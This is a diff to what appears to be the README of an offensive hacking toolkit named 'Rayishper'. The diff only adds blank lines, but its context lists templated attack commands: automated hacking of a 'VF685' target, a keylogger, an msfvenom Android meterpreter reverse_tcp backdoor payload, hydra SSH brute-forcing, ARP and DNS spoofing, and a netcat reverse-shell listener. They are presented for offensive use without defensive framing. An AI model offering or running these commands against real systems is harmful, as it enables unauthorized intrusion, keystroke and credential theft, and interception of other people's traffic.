@@ -79,6 +79,7 @@ Below is a summary of the main commands used within Rayishper:
 
 ## VF685 Hack
 Description: Automate hacking a specific VF685 target.
+
 Command: 
 ```bash 
 python3 VF685.py
@@ -86,6 +87,7 @@ python3 VF685.py
 
 ## Keylogger Deployment
 Description: Start a keylogger that logs keystrokes to a file.
+
 Command:
 ```bash 
  python3 keylog.py
@@ -93,6 +95,7 @@ Command:
 
 ## Payload Creation
 Description: Generate a custom Android payload using Metasploit.
+
 Command: 
 ```bash 
 msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} R> {location}/{Backdoor_name}
@@ -100,6 +103,7 @@ msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} R> {loca
 
 ## SSH Brute-Force
 Description: Perform a brute-force attack on SSH login.
+
 Command: 
 ```bash
 hydra -l {username} -P {wordlist} ssh://{target_ip}
@@ -107,6 +111,7 @@ hydra -l {username} -P {wordlist} ssh://{target_ip}
 
 ## Network Scanning
 Description: Scan a target IP for open ports and services.
+
 Command: 
 ```bash
 nmap -sV {target_ip}
@@ -114,6 +119,7 @@ nmap -sV {target_ip}
 
 ## ARP Spoofing
 Description: Perform ARP spoofing to intercept traffic.
+
 Command: 
 ```bash
 sudo arpspoof -i eth0 -t {target_ip} -r {gateway_ip}
@@ -121,6 +127,7 @@ sudo arpspoof -i eth0 -t {target_ip} -r {gateway_ip}
 
 ## Reverse Shell Listener
 Description: Start a netcat listener for reverse shells.
+
 Command: 
 ```bash
 nc -lvnp {lport}
@@ -128,6 +135,7 @@ nc -lvnp {lport}
 
 ## DNS Spoofing
 Description: Spoof DNS responses on a network.
+
 Command: 
 ```bash
 sudo dnsspoof
